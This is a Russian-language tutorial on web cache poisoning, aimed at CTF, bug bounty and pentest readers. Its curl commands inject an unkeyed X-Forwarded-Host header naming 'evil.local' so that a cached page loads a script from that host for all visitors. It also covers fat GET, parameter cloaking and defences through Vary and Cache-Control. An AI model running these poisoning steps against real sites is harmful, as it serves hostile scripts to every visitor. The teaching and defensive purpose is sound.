## Вопрос, с которого всё начинается

Перед сайтом стоит кэш (CDN), который хранит ответы и отдаёт их всем посетителям. Если ты отравишь один ответ — его получит **каждый**. Это Web Cache Poisoning: одна маленькая уязвимость превращается в атаку на всех пользователей.

Сегодня мы возьмём сайт за CDN и научимся портить кэш неучтённым заголовком.

## Наш пример

`shop.local` за кэшем. Смотрим заголовки ответа:

```bash
$ curl -sI https://shop.local/
HTTP/1.1 200 OK
Cache-Control: public, max-age=60
X-Cache: HIT
Age: 15
```

`X-Cache: HIT` — ответ отдан из кэша. `Age: 15` — лежит там 15 секунд. Значит, кэш есть и работает.

## Шаг 1: что входит в кэш-ключ

Кэш решает, «тот же это ответ или новый», по **кэш-ключу**. Обычно ключ — метод + путь + (иногда) несколько заголовков из `Vary`. Всё, что **не** входит в ключ, но влияет на ответ, — потенциальная точка отравления. Такие заголовки называют **unkeyed** (неучтёнными).

Проверим `Vary`:

```bash
$ curl -sI https://shop.local/ | grep -i vary
Vary: Accept-Encoding
```

В ключе только `Accept-Encoding`. Значит, `X-Forwarded-Host`, `X-Forwarded-Scheme`, `User-Agent` и куча других — неучтённые. Если приложение использует их в ответе, кэш отравится.

## Шаг 2: находим unkeyed-заголовок

Подставим `X-Forwarded-Host` и посмотрим, попадёт ли он в ответ:

```bash
$ curl -s https://shop.local/ -H 'X-Forwarded-Host: evil.local' | grep -o 'evil.local'
evil.local
```

Ответ содержит `evil.local`. Значит, приложение подставляет этот заголовок в страницу (например, в ссылки или canonical URL). И он **не** входит в кэш-ключ. Идеальная цель.

## Шаг 3: отравляем кэш

Теперь главное — попасть в кэш. Нужно, чтобы кэш **запомнил** наш ответ. Проверяем, кэшируется ли страница с этим заголовком:

```bash
$ curl -s https://shop.local/ -H 'X-Forwarded-Host: evil.local' -o /dev/null -w '%{http_code}\n'
200
$ curl -sI https://shop.local/ | grep -i 'x-cache\|age'
X-Cache: HIT
Age: 2
```

Запрос с неучтённым заголовком закэширован (`HIT`, `Age: 2`). Теперь **обычный** запрос без заголовка:

```bash
$ curl -s https://shop.local/ | grep -o 'evil.local'
evil.local
```

Отравлено! Обычный посетитель получает страницу со ссылками на `evil.local`. Это уже impact: XSS, подмена ссылок, кража токенов.

## Шаг 4: усиливаем — куда положить payload

Отравить можно не только текст. Классические цели:

- **XSS** — если неучтённый заголовок попадает в HTML без экранирования.
- **Redirect** — если заголовок влияет на `Location`.
- **Ресурсы** — если он подставляется в `<script src=...>`.

Например, если `X-Forwarded-Host` попадает в `<script src="//X-Forwarded-Host/app.js">`, можно отравить кэш так, что все грузят наш скрипт:

```bash
$ curl -s https://shop.local/ -H 'X-Forwarded-Host: evil.local' | grep -o '<script src="[^"]*"'
<script src="//evil.local/app.js">
```

## Шаг 5: fat GET и parameter cloaking

Иногда кэш игнорирует тело GET-запроса, а приложение его читает (**fat GET**). Тогда кладём payload в тело:

```bash
$ curl -s -X GET https://shop.local/ --data 'utm=evil' -o /dev/null -w '%{http_code}\n'
200
```

Или используем разный разбор параметров: кэш считает один параметр ключевым, приложение — другой (**parameter cloaking**). Все эти приёмы — снова расхождение парсеров кэша и приложения.

## Полный прогон от начала до конца

Смотрим `Vary` — в ключе только `Accept-Encoding`. Подставляем `X-Forwarded-Host` — попадает в HTML. Отправляем запрос, кэш сохраняет (`HIT`). Обычный запрос отдаёт отравленную страницу. Находим, что заголовок попадает в `<script src>`, — и все грузят наш скрипт. В отчёт идёт три запроса: отравляющий, проверка кэша и обычный — с одинаковым результатом.

## Почему кэш так легко отравить

Кэш оптимизирован под скорость, а не под безопасность. Он строит **ключ** из «того, что обычно отличает ответы»: метод, путь, иногда пара заголовков из `Vary`. Всё остальное он считает неважным — и именно там прячется уязвимость. Приложение же читает **много** заголовков: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-For`, `User-Agent`, `Accept-Language`. Если хоть один из них влияет на ответ, но не входит в ключ, — кэш сохранит «отравленный» ответ и отдаст его всем. Отсюда и название: **unkeyed input**. Правило защиты простое: либо все входы, влияющие на ответ, должны быть в `Vary`, либо приложение не должно использовать заголовки, которые кэш не учитывает.

## Инструменты

Основное — **Burp Repeater** и расширение **Param Miner** (ищет unkeyed-заголовки автоматически, перебирая их и сравнивая ответы). Смотри `X-Cache`, `Age`, `Cache-Control`, `Vary` — по ним видно, кэшируется ли ответ и что в ключе. Полезно вести таблицу «заголовок → попал в ответ? → входит в ключ?». Для проверки эффекта открой URL в новом браузере без заголовков — если видишь отраву, кэш сработал.

## Если не сработало

Если заголовок не попадает в ответ, проверь другие. Список для перебора: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`, `User-Agent`, `Accept-Language`, `X-Forwarded-For`. Иногда влияет не заголовок, а **метод** или **тело** (fat GET). Если ответ не кэшируется с твоим заголовком — возможно, кэш учитывает его в ключе (`Vary`); тогда ищи другой. Бывает, что кэшируется только «первый» ответ — тогда сначала «прогрей» кэш обычным запросом, потом отравляй. И проверяй эффект в **новом** браузере/сессии, чтобы исключить локальный кэш.

## Как оформить находку

Покажи три запроса: (1) отравляющий — с unkeyed-заголовком; (2) проверку кэша — `X-Cache: HIT`; (3) обычный — без заголовка, но с отравленным содержимым. Именно третий доказывает, что пострадают все. Если payload даёт XSS — приложи исполнение скрипта в браузере.

## Частые вопросы

**«Как отличить poisoning от deception?»** Poisoning **портит** ответ для всех (XSS, redirect), deception — **воруёт** приватный ответ. Оба про кэш, но цели разные.

**«Почему отравление действует на всех?»** Потому что кэш отдаёт один и тот же сохранённый ответ всем, кто запрашивает тот же ключ. Один отравленный ответ — для тысяч пользователей.

**«Как не спутать с обычным отражением?»** Отражение действует только на твой запрос; poisoning — на любой последующий. Проверяй новым клиентом без заголовков.

## Что мы теперь знаем

- Кэш-ключ определяет, какой ответ «тот же».
- Неучтённый (unkeyed) заголовок, влияющий на ответ, — точка отравления.
- Отравив кэш, получаешь атаку на всех пользователей.
- Цели: XSS, redirect, подмена ресурсов.
- Fat GET и parameter cloaking используют расхождение кэша и приложения.

## На что смотреть дальше

- Смотри `Vary` и `X-Cache`, чтобы понять кэш-ключ.
- Перебирай заголовки, попадающие в ответ (`X-Forwarded-*`, `X-Host`, `User-Agent`).
- Проверяй, кэшируется ли ответ с твоим заголовком.
- Помни: cache poisoning — атака «на всех», импакт куда выше одиночного XSS.

## Куда дальше

Дальше разберём обратную сторону кэша — cache deception: как заставить кэш сохранить **приватную** страницу жертвы и затем прочитать её. А пока главное: всё, что не входит в кэш-ключ, но влияет на ответ, — твоя точка входа.

## Где пригодится

- **CTF (Web):** cache poisoning/deception — популярные сложные задачи на CDN.
- **Bug bounty:** отравление кэша (XSS/redirect для всех) и утечка через deception — высокие выплаты.
- **Пентест:** анализ кэш-ключей и `Vary` — часть тестирования CDN-инфраструктуры.
- **Работа (AppSec/Dev):** корректный `Vary`, `Cache-Control: private` для приватных страниц — базовый харденинг.
